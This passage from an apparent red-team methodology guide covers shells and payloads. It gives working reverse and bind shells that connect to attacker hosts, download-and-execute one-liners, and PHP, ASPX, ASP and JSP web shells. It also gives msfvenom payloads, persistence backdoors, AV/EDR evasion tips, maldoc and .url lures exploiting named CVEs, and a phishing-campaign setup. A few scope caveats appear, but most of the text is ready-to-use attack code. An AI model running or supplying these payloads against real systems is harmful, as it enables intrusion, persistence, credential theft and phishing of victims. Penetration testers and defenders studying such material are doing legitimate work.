C:\Progra~1\OpenSSL-Win64\bin\openssl.exe sha256 C:\Users\Public\payload.bin
```

#### base64 encode/decode for text-channel exfil (DNS TXT, web form, paste)

```cmd
C:\Progra~1\OpenSSL-Win64\bin\openssl.exe base64 -in secret.pvk -out secret.pvk.b64
```

```bash
# Attacker side — decode
openssl base64 -d -in secret.pvk.b64 -out secret.pvk
```

> **LOTL caveat:** OpenSSL is third-party on Windows — confirm presence first. Common bundled paths: `C:\Program Files\OpenSSL-Win64\bin\openssl.exe`, `C:\Program Files\Git\usr\bin\openssl.exe`, `C:\xampp\apache\bin\openssl.exe`.

> **OPSEC:** TLS hides the payload from plaintext IDS but the JA3 fingerprint of `openssl s_client` is well-known (commonly flagged by mature SOCs). TLS on uncommon outbound ports (73, 136, etc.) is itself an IOC — egress port choice trades firewall bypass for detection signal.

[^ top](#shells-and-payloads-methodology)

---

## Phase 3: TTY Upgrade

### Linux Reverse Shell → Full PTY

```bash
# Step 1 — spawn pty
python3 -c 'import pty; pty.spawn("/bin/bash")'
# fallback if no python3:
python -c 'import pty; pty.spawn("/bin/bash")'
script -q /dev/null /bin/bash
/usr/bin/script -qc /bin/bash /dev/null

# Step 2 — background and configure raw mode
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice

# Step 3 — set terminal type and size
export TERM=xterm-256color
export SHELL=bash
stty rows 50 columns 200
# (Get values from local terminal: stty size)
```

### One-shot Upgrade Cheatsheet

```bash
# All-in-one (after catching shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
reset
export TERM=xterm-256color
stty rows $(tput lines) columns $(tput cols)
```

### Socat Interactive Listener (skip TTY upgrade altogether)

```bash
# Attacker — pty listener
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Victim Linux
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<ATTACKER_IP>:4444

# Static socat for victims without socat — stage from Kali
# Source: https://github.com/andrew-d/static-binaries (linux/x86_64/socat)
# Attacker (Kali): obtain static socat binary locally, then: python3 -m http.server 80
wget -q http://<ATTACKER_IP>/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<ATTACKER_IP>:4444
```

### Windows Full PTY — ConPtyShell

```powershell
# Attacker
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# Victim (ConPtyShell) — fetch from attacker-hosted SimpleHTTPServer (do NOT pull directly from GitHub raw)
# Attacker (Kali): obtain Invoke-ConPtyShell.ps1 locally, then: python3 -m http.server 80
# Victim:   IEX(IWR http://<ATTACKER_IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing)
Invoke-ConPtyShell <ATTACKER_IP> 4444 -Rows 50 -Cols 200
```

[^ top](#shells-and-payloads-methodology)

---

## Phase 4: Catching Shells with pwncat-cs

`pwncat-cs` is the modern Python rewrite of pwncat (Caleb Stewart fork). Provides automatic TTY upgrade, persistence, privesc enumeration, and tab completion in caught shells.

```bash
# Install (if not present)
pipx install pwncat-cs

# Listen
pwncat-cs -lp 4444

# Connect to bind shell
pwncat-cs <TARGET_IP>:4444

# SSH-style connection
pwncat-cs ssh://user:pass@<TARGET_IP>
```

### pwncat-cs Workflow

```text
# After shell catches, drop to pwncat prompt with Ctrl+D
(local) pwncat$ help                    # list commands
(local) pwncat$ sessions                # list active sessions
(local) pwncat$ session 1               # switch session
(local) pwncat$ download /etc/shadow    # pull file
(local) pwncat$ upload /tmp/linpeas.sh  # push file
(local) pwncat$ run enumerate           # run all enum modules
(local) pwncat$ run enumerate.gather    # detailed gather
(local) pwncat$ run privesc.list        # list privesc paths
(local) pwncat$ run privesc.escalate    # auto-escalate
(local) pwncat$ run persist.add         # add persistence
(local) pwncat$ back                    # back to remote shell
```

### pwncat-cs Persistence Modules

```text
(local) pwncat$ run persist.gather                    # list installed
(local) pwncat$ run persist.add persist.authorized_keys
(local) pwncat$ run persist.add persist.passwd_backdoor user=root password=<PASSWORD>
(local) pwncat$ run persist.add persist.system_systemd
(local) pwncat$ run persist.remove ...                # cleanup
```

[^ top](#shells-and-payloads-methodology)

---

## Phase 5: Web Shells

### PHP — minimal

```php
<?php system($_GET['c']); ?>
```

```php
<?php
// More featureful
if(isset($_REQUEST['c'])){echo "<pre>";passthru($_REQUEST['c']);echo "</pre>";}
?>
```

```bash
# Trigger
curl "http://<TARGET_IP>/shell.php?c=id"
curl "http://<TARGET_IP>/shell.php?c=$(echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64 -w0)" \
  --data-urlencode "c=echo <BASE64> | base64 -d | bash"
```

### ASPX — minimal

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start("cmd.exe","/c " + Request["c"]); %>
```

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
string cmd = Request["c"];
ProcessStartInfo psi = new ProcessStartInfo("cmd.exe","/c "+cmd);
psi.RedirectStandardOutput = true; psi.UseShellExecute = false;
Process p = Process.Start(psi);
Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
%>
```

### Classic ASP (VBScript) — IIS Legacy Servers

Classic ASP (.asp) runs VBScript server-side on IIS. Common on legacy Windows Server 2003/2008 hosts and older intranet applications. When user input is reflected into ASP execution context or you can upload .asp files, WScript.Shell provides command execution.

```asp
<%
' Minimal classic ASP webshell — cmd exec via WScript.Shell
Dim cmd, obj, output
cmd = Request("c")
If cmd <> "" Then
  Set obj = CreateObject("WScript.Shell")
  Set output = obj.Exec("cmd.exe /c " & cmd)
  Response.Write("<pre>" & output.StdOut.ReadAll & "</pre>")
End If
%>
```

```asp
<%
' Reverse shell trigger — calls pre-staged payload or PowerShell
Dim obj
Set obj = CreateObject("WScript.Shell")
obj.Run "powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sbb=([text.encoding]::ASCII).GetBytes($sb);$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()""", 0, False
%>
```

```bash
# Trigger webshell
curl "http://<TARGET>/shell.asp?c=whoami"

# Code injection into vulnerable ASP page (input reflected into Eval/Execute)
# If target has: <% Execute(Request("code")) %>
curl "http://<TARGET>/vuln.asp" --data-urlencode 'code=Set s=CreateObject("WScript.Shell"):Set r=s.Exec("cmd /c whoami"):Response.Write(r.StdOut.ReadAll)'
```

#### Living-off-the-land / LOTL variant

Classic ASP is itself LOTL on any IIS host with ASP enabled (default on legacy servers). No tools to install; WScript.Shell and Scripting.FileSystemObject are built-in COM objects:

```asp
<%
' File write via built-in FileSystemObject (stage next payload without upload vuln)
Dim fso, f
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.CreateTextFile("C:\inetpub\wwwroot\cmd.asp", True)
f.Write "<%Set o=CreateObject(""WScript.Shell""):Set r=o.Exec(""cmd /c ""&Request(""c"")):Response.Write(r.StdOut.ReadAll)%>"
f.Close
Response.Write("Dropped cmd.asp")
%>
```

### JSP — minimal

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("c");
if(cmd != null){
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line; while((line = br.readLine()) != null){ out.println(line); }
}
%>
```

### Generated Web Shells (msfvenom)

```bash
# PHP meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.php
(echo '<?php '; cat shell.php) > shell_complete.php

# ASPX meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f aspx -o shell.aspx

# WAR (Tomcat manager upload)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f war -o shell.war
jar tf shell.war   # confirm contents
# After deploy: curl http://<TARGET_IP>:8080/shell/

# JSP shell (drop in webroot)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.jsp
```

### Specialized Web Shells

```bash
# weevely — encrypted PHP webshell
weevely generate <PASSWORD> /tmp/weevely.php
weevely http://<TARGET_IP>/weevely.php <PASSWORD>

# Inside weevely:
:audit_suidsgid
:file_download /etc/passwd ./passwd
:shell_php "system('id');"
```

| Tool | Type | Notes |
|------|------|-------|
| **weevely** | PHP | Encrypted, terminal-like, audit modules |
| **antSword** | Multi (PHP/ASP/JSP) | GUI, plugin ecosystem, AES encrypted |
| **Behinder** | Multi (encrypted dynamic) | Chinese, in-memory, very evasive |
| **Godzilla** | Multi (encrypted dynamic) | Successor to Behinder, AES+base64 |
| **chopper / china chopper** | ASP/PHP | Tiny one-liner, GUI client |

### Razor Class Library DLL — Upload-to-RCE in Blazor/ASP.NET Core

When a Blazor Server or ASP.NET Core app allows file upload into a path that gets loaded as a Razor component (e.g., path traversal into `Pages/` or a plugin directory), a malicious Razor Class Library DLL achieves RCE without traditional webshell detection.

```bash
# On attacker Linux box — create malicious Razor Class Library
mkdir -p /tmp/razorpwn && cd /tmp/razorpwn
dotnet new razorclasslib -n MalLib --no-https
cd MalLib

# Replace default component with RCE component
cat > Component1.razor << 'EOF'
@page "/pwn"
@using System.Diagnostics

<h3>@output</h3>

@code {
    [Parameter]
    [SupplyParameterFromQuery(Name = "c")]
    public string Cmd { get; set; }
    private string output;
    protected override void OnInitialized()
    {
        if (!string.IsNullOrEmpty(Cmd))
        {
            var psi = new ProcessStartInfo("/bin/sh", $"-c \"{Cmd}\"")
            { RedirectStandardOutput = true, UseShellExecute = false };
            var p = Process.Start(psi);
            output = p.StandardOutput.ReadToEnd();
        }
    }
}
EOF

# Build the DLL
dotnet build -c Release
# Output: bin/Release/net8.0/MalLib.dll (adjust TFM to match target)
```

```bash
# Upload via path traversal to target's component scan directory
curl -F "file=@bin/Release/net8.0/MalLib.dll;filename=../Pages/MalLib.dll" http://<TARGET>/upload

# Trigger (if hot-reload or app restart picks up the DLL)
curl "http://<TARGET>/pwn?c=id"
```

#### Living-off-the-land / LOTL variant

On a Windows target with .NET SDK already installed (dev servers, build agents):

```powershell
# Create and build entirely on-target (LOTL — no file transfer of DLL needed)
mkdir C:\Temp\mal && cd C:\Temp\mal
dotnet new razorclasslib -n Pwn --no-https
# Then write the malicious .razor file via echo/Out-File and build with dotnet build
# Copy resulting DLL to the app's assembly probe path
copy bin\Release\net8.0\Pwn.dll C:\inetpub\wwwroot\bin\Pwn.dll
```

> **Note:** Requires the target to restart or use hot-reload. If the app uses `AddAdditionalAssemblies()`, the DLL is picked up on next request. Otherwise, trigger an app pool recycle: `cmd /c iisreset` (requires admin) or wait for idle timeout.

[^ top](#shells-and-payloads-methodology)

---

## Phase 6: Bind Shells

### Tool-based

```bash
# msfvenom bind shell
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf -o bind.elf

# Catching:
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/bind_tcp; \
  set RHOST <TARGET_IP>; set LPORT 4444; exploit"
```

### LOTL Bind Shells

```bash
# Linux — mkfifo + nc bind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp 4444 >/tmp/f

# Linux — ncat with -e
ncat -lvnp 4444 -e /bin/bash

# Linux — socat bind with PTY
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane

# Windows — ncat (if available)
ncat -lvnp 4444 -e cmd.exe

# Windows PowerShell bind shell (LOTL)
powershell -c "$listener = [System.Net.Sockets.TcpListener]4444; $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"

# Connect from attacker:
nc <TARGET_IP> 4444
```

[^ top](#shells-and-payloads-methodology)

---

## Phase 7: Detection Evasion Basics

> Detailed AV/EDR bypass lives in [av-evasion.md](av-evasion.md). Quick checklist below.

- Prefer **stageless** payloads to avoid stub-fetch IDS signatures
- Use `reverse_https` over `reverse_tcp` — TLS encrypts traffic and ports 443/8443 are typically allowed outbound
- Use **template injection** (`-x putty.exe -k`) over plain `-f exe`
- Replace msfvenom encoders (signatured) with **donut** or **sgn**
- Strip PE compilation artifacts: `strip`, custom resources, valid certificates (signing)
- Use **AMSI bypass** before any PowerShell payload (cross-link [windows-methodology.md](windows-methodology.md))
- Avoid dropping to disk — prefer in-memory execution (`IEX`, `Add-Type`, .NET reflection)
- Match parent process: spawn from `explorer.exe` / `svchost.exe` rather than `cmd.exe → powershell.exe`

[^ top](#shells-and-payloads-methodology)

---

## Phase 8: Payload Delivery Vectors

High-level reference — keep deliveries authorized and in-scope.

### HTA (HTML Application)

```bash
# Generate
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f hta-psh -o payload.hta

# Host & deliver
python3 -m http.server 80
# Victim:
mshta http://<ATTACKER_IP>/payload.hta
```

### LNK Files

```powershell
# Create LNK that invokes powershell payload
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$pwd\Invoice.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-nop -w hidden -c `"IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/p.ps1'))`""
$Shortcut.IconLocation = "shell32.dll,3"
$Shortcut.Save()
```

### ISO / IMG Mount Containers

```bash
# Build ISO containing LNK + hidden payload (bypasses Mark-of-the-Web on older Windows)
mkisofs -o payload.iso -V "Invoice" -J -r ./payload_dir/

# Modern approach: PackMyPayload
python3 PackMyPayload.py payload.exe out.iso
```

### OneNote `.one` Embedded Attachments

- Embed `.hta`, `.bat`, `.cmd`, `.vbs`, `.js`, `.ps1` in OneNote section
- Lure to "click to open" — runs attachment via shell association
- Mitigated in current Office; still effective on unpatched / pre-2023 builds

### CVE-2023-2255 — LibreOffice Macro-less RCE via Floating Frame

LibreOffice <= 7.4.7 / 7.5.3 loads external content from IFrame/floating-frame elements in .odt/.odp files without any user prompt. Achieves code execution without macros enabled by pointing the frame at an attacker-hosted file that triggers a handler (e.g., .jar, .bat via file:// or SMB UNC).

```bash
# Create malicious .odt on attacker Linux box
mkdir -p /tmp/odt_exploit && cd /tmp/odt_exploit

# Create content.xml with floating frame pointing at attacker
cat << 'EOF' > content.xml
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
  xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0"
  office:version="1.3">
<office:body><office:text>
<text:p>Loading...</text:p>
<draw:frame draw:name="pwn" svg:width="0.1cm" svg:height="0.1cm" text:anchor-type="char">
  <draw:floating-frame xlink:href="http://<ATTACKER_IP>:<ATTACKER_PORT>/payload" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
</draw:frame>
</office:text></office:body>
</office:document-content>
EOF

# Minimal META-INF/manifest.xml
mkdir -p META-INF
cat << 'EOF' > META-INF/manifest.xml
<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3">
 <manifest:file-entry manifest:full-path="/" manifest:version="1.3" manifest:media-type="application/vnd.oasis.opendocument.text"/>
 <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
</manifest:manifest>
EOF

# Create mimetype file (must be first in ZIP, uncompressed)
echo -n "application/vnd.oasis.opendocument.text" > mimetype

# Package as .odt (ZIP with mimetype first, stored not deflated)
zip -0 -X exploit.odt mimetype
zip -r exploit.odt content.xml META-INF/
```

```bash
# Attacker — host payload (e.g., respond with .bat content or redirect to SMB for hash capture)
# For RCE: serve a file that the OS will execute via handler association
python3 -m http.server <ATTACKER_PORT>

# For NTLM hash theft variant: point floating-frame at \\<ATTACKER_IP>\share\doc
# Then catch with responder/impacket-smbserver
impacket-smbserver share /tmp/share -smb2support
```

#### Living-off-the-land / LOTL variant

The .odt can be crafted entirely with LOTL tools (mkdir, echo, zip are standard). On Windows target, if you need to create the lure locally:

```powershell
# PowerShell — create .odt lure without LibreOffice installed
$content = @'
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" office:version="1.3"><office:body><office:text><text:p>Review</text:p><draw:frame draw:name="f" svg:width="0.1cm" svg:height="0.1cm" text:anchor-type="char"><draw:floating-frame xlink:href="\\<ATTACKER_IP>\share\payload" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></office:text></office:body></office:document-content>
'@
# Build ZIP manually with .NET compression classes
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::Open("C:\Temp\lure.odt","Create")
$entry = $zip.CreateEntry("mimetype",[System.IO.Compression.CompressionLevel]::NoCompression)
$sw = New-Object System.IO.StreamWriter($entry.Open()); $sw.Write("application/vnd.oasis.opendocument.text"); $sw.Dispose()
$entry2 = $zip.CreateEntry("content.xml")
$sw2 = New-Object System.IO.StreamWriter($entry2.Open()); $sw2.Write($content); $sw2.Dispose()
$zip.Dispose()
```

> **Scope:** Affects LibreOffice <= 7.4.7 and <= 7.5.3. Patched in 7.4.8 / 7.5.4+. Check target version before using.

### CVE-2023-36025 — SmartScreen Bypass via .url in ZIP

Windows SmartScreen (MOTW enforcement) can be bypassed on unpatched Windows 10/11 by embedding a .url Internet Shortcut file inside a ZIP archive. When the user extracts and clicks the .url file, SmartScreen does not display the usual warning dialog, allowing execution of the referenced payload without the MOTW block.

```bash
# Step 1: Generate payload and host on SMB or WebDAV
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o payload.exe

# Host on attacker SMB share
impacket-smbserver share /tmp/payloads -smb2support
# Or host via WebDAV (wsgidav)
# wsgidav --host 0.0.0.0 --port 80 --root /tmp/payloads --auth anonymous
```

```bash
# Step 2: Create .url file pointing at the payload on attacker share
cat << 'EOF' > report.url
[InternetShortcut]
URL=file://<ATTACKER_IP>/share/payload.exe
IconIndex=0
IconFile=C:\Windows\System32\shell32.dll
EOF
```

```bash
# Step 3: Package into ZIP (the ZIP container strips MOTW from extracted contents on older builds)
zip -j lure.zip report.url

# Deliver lure.zip via phishing email, web download, or file share
```

```bash
# Alternative: reference a WebDAV-hosted payload (for environments blocking SMB outbound)
cat << 'EOF' > invoice.url
[InternetShortcut]
URL=http://<ATTACKER_IP>/payload.exe
IconIndex=70
IconFile=C:\Windows\System32\shell32.dll
EOF
zip -j invoice.zip invoice.url
```

#### Living-off-the-land / LOTL variant

Create the .url and ZIP entirely with built-in Windows tools (no Python/msfvenom on target):

```powershell
# Create .url lure on Windows
Set-Content -Path "C:\Temp\report.url" -Value @"
[InternetShortcut]
URL=file://<ATTACKER_IP>/share/payload.exe
IconIndex=0
IconFile=C:\Windows\System32\shell32.dll
"@

# ZIP using built-in Compress-Archive
Compress-Archive -Path "C:\Temp\report.url" -DestinationPath "C:\Temp\lure.zip"
```

> **Scope:** Affects unpatched Windows before November 2023 patch (KB5032189/KB5032190). Modern fully-patched Windows enforces SmartScreen on .url regardless of container.

### .url Internet Shortcut — Click-to-Exec via SMB UNC

A .url file with `URL=` pointing at an executable on an attacker SMB share provides one-click code execution. Unlike the NTLM-hash-coercion technique (which uses `IconFile=` to force an authentication attempt on icon load), this variant uses the `URL=` field to execute a binary when the user double-clicks the shortcut.

```bash
# Step 1: Generate payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o payload.exe

# Step 2: Host on SMB share (impacket)
mkdir /tmp/share && cp payload.exe /tmp/share/
impacket-smbserver share /tmp/share -smb2support
```

```bash
# Step 3: Create .url lure pointing URL= at the executable
cat << 'EOF' > Q3-Report.url
[InternetShortcut]
URL=file://<ATTACKER_IP>/share/payload.exe
WorkingDirectory=C:\Windows\System32
IconIndex=1
IconFile=C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
HotKey=0
EOF
```

```bash
# Step 4: Deliver via email attachment, file share drop, or web download
# For additional stealth, combine with ZIP container to strip MOTW (see CVE-2023-36025 above)
zip -j Q3-Report.zip Q3-Report.url
```

```bash
# Variant: .url pointing at WebDAV path (when SMB 445 is blocked outbound)
cat << 'EOF' > Expenses.url
[InternetShortcut]
URL=http://<ATTACKER_IP>/payload.exe
IconIndex=1
IconFile=C:\Windows\System32\shell32.dll
EOF
```

```bash
# Variant: combine with NTLM coercion (IconFile for hash, URL for exec — double-tap)
cat << 'EOF' > Payroll.url
[InternetShortcut]
URL=file://<ATTACKER_IP>/share/payload.exe
IconIndex=0
IconFile=\\<ATTACKER_IP>\icons\excel.ico
EOF
# IconFile triggers NTLM auth on icon render (even without click) — catch with Responder
# URL triggers execution on double-click — catch with multi/handler
```

#### Living-off-the-land / LOTL variant

Create .url files with only built-in Windows commands (no PowerShell required):

```cmd
REM Create .url from cmd.exe (echo to file)
echo [InternetShortcut] > C:\Temp\Report.url
echo URL=file://<ATTACKER_IP>/share/payload.exe >> C:\Temp\Report.url
echo IconIndex=1 >> C:\Temp\Report.url
echo IconFile=C:\Windows\System32\shell32.dll >> C:\Temp\Report.url
```

```powershell
# PowerShell variant with Out-File
@"
[InternetShortcut]
URL=file://<ATTACKER_IP>/share/payload.exe
IconIndex=1
IconFile=C:\Windows\System32\shell32.dll
"@ | Out-File -Encoding ascii C:\Temp\Report.url
```

> **Note:** Distinguish from the NTLM hash coercion .url technique (documented in active-directory-methodology.md) which uses `IconFile=\\attacker\share` for authentication relay. This technique uses `URL=` for direct code execution on user click.

### Macro-enabled Documents

```bash
# Generate VBA macro
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f vba -o macro.vba

# Tools for delivery doc creation:
# - macro_pack:    macro_pack -f payload.vba -o -G out.docm
# - EvilClippy:    EvilClippy -s decoy.vba -t 2010 lure.doc
# - msfvenom -f vba-exe : combined VBA+EXE for older Office
```

### RTF / DOCX OLE2Link Maldoc (CVE-2017-0199 / CVE-2017-8570)

OLE2Link auto-fetches a remote HTA on document open — executes outside the macro warning prompt on unpatched Office (pre-2018). Variant CVE-2017-8570 covers DOCX template-injection and remote `.sct` scriptlets.

```bash
# https://github.com/bhdresh/CVE-2017-0199
# Generate malicious RTF that fetches HTA on open (CVE-2017-0199)
python cve-2017-0199_toolkit.py -M gen -t RTF -w lure.rtf -u http://<ATTACKER_IP>:<ATTACKER_PORT>/payload.hta

# Generate HTA payload to be fetched
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f hta-psh -o payload.hta

# Variant — DOCX template injection / SCT scriptlet (CVE-2017-8570)
python cve-2017-0199_toolkit.py -M gen -t DOC -w lure.doc -u http://<ATTACKER_IP>:<ATTACKER_PORT>/template.sct

# Host the HTA / SCT
python3 -m http.server <ATTACKER_PORT>

# Catch the callback
nc -lvnp <ATTACKER_PORT>
```

> **Tip:** OLE2Link executes the HTA via `mshta` outside the macro-warning prompt on unpatched Office. On patched/modern Office, fall back to remote-template injection (`.dotm` referenced from a DOCX `word/_rels/settings.xml.rels`).

> **OPSEC:** Raw RTF maldocs hit signature on most modern EDR. For engagement use, host HTA over HTTPS with a valid cert and stage Empire/Sliver beacons rather than raw msfvenom HTA-PSH.

### XLL / VSTO / .docm sideload

- XLL: native Excel addin, runs as DLL on open. Generated via `xllgenerator`, `Excel-XLL-Phishing` repo, or custom VS project.
- VSTO: signed managed addin; persistence via `HKCU\Software\Microsoft\Office\<OFFICE_APP>\Addins`.

### Phishing Campaign Infrastructure (GoPhish + SMTP Relay + Payload Server)

End-to-end campaign ops layer: tracker (GoPhish), authenticated outbound mail (Postfix + SPF/DKIM/DMARC), HTTPS payload host. Payload-content generation lives in the sections above; this is the delivery infrastructure.

```bash
# GoPhish — campaign management, templates, landing pages, click/open tracking
# Source: https://github.com/gophish/gophish (releases → linux-64bit.zip)
# On Kali: download latest release from the GitHub releases page
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-*.zip && cd gophish
# Edit config.json: bind admin to 127.0.0.1:3333, phish_server to 0.0.0.0:80 (or 443 with cert)
./gophish
# First-run admin password printed to stdout
# Browse https://127.0.0.1:3333 — configure Sending Profile, Email Template, Landing Page, Users & Groups, Campaign
```

```bash
# Postfix relay on attacker VPS — full control over headers / from-address / DKIM
apt install -y postfix mailutils opendkim opendkim-tools
# /etc/postfix/main.cf:
#   myhostname = mail.<DOMAIN>
#   inet_interfaces = all
#   smtpd_milters = inet:127.0.0.1:8891
#   non_smtpd_milters = inet:127.0.0.1:8891
systemctl restart postfix
```

```text
# DNS records on attacker domain (publish at registrar)
<DOMAIN>.            IN  A    <ATTACKER_IP>
mail.<DOMAIN>.       IN  A    <ATTACKER_IP>
<DOMAIN>.            IN  MX   10 mail.<DOMAIN>.
<DOMAIN>.            IN  TXT  "v=spf1 ip4:<ATTACKER_IP> ~all"
default._domainkey.<DOMAIN>. IN TXT "v=DKIM1; k=rsa; p=<DKIM_PUBKEY>"
_dmarc.<DOMAIN>.     IN  TXT  "v=DMARC1; p=none; rua=mailto:postmaster@<DOMAIN>"
```

```bash
# SMTP delivery test — confirm mail leaves and lands in inbox (not spam)
swaks --to <USER>@<DOMAIN> --from "sender@<ATTACKER_DOMAIN>" \
  --header "Subject: <SUBJECT>" --body "<BODY>" \
  --attach @lure.docm --server <ATTACKER_IP>:25
```

```bash
# Payload web server — HTTPS via Let's Encrypt (Office/SmartScreen flag plain HTTP)
certbot certonly --standalone -d payload.<ATTACKER_DOMAIN>
python3 -c "import http.server, ssl; s=http.server.HTTPServer(('0.0.0.0',443), http.server.SimpleHTTPRequestHandler); ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain('/etc/letsencrypt/live/payload.<ATTACKER_DOMAIN>/fullchain.pem','/etc/letsencrypt/live/payload.<ATTACKER_DOMAIN>/privkey.pem'); s.socket=ctx.wrap_socket(s.socket, server_side=True); s.serve_forever()"
```

> **Tip:** Categorize the attacker domain ahead of campaign — uncategorized domains land in spam. Aged domains via expireddomains.net; submit to bluecoat/symantec for category review.

> **OPSEC:** Stand up infra ≥1 week pre-engagement. Mid-engagement domain spin-up flags reputation filters. Warm the IP with low-volume legitimate-looking mail before campaign send.

> **RoE:** Phishing infra is tier-2 engagement work — confirm scope authorizes email delivery to in-scope users on in-scope domains before sending.

[^ top](#shells-and-payloads-methodology)

---

## Quick Reference Cheatsheet

```bash
# Most common payload (Windows x64 HTTPS)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o p.exe

# Most common Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o p.elf

# Most common LOTL Linux rev shell
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'

# Most common LOTL Windows rev shell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'> ';$sbb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()"

# Universal listener
pwncat-cs -lp 4444

# TTY upgrade trinity
python3 -c 'import pty;pty.spawn("/bin/bash")'; ^Z; stty raw -echo; fg; export TERM=xterm-256color
```

[^ top](#shells-and-payloads-methodology)
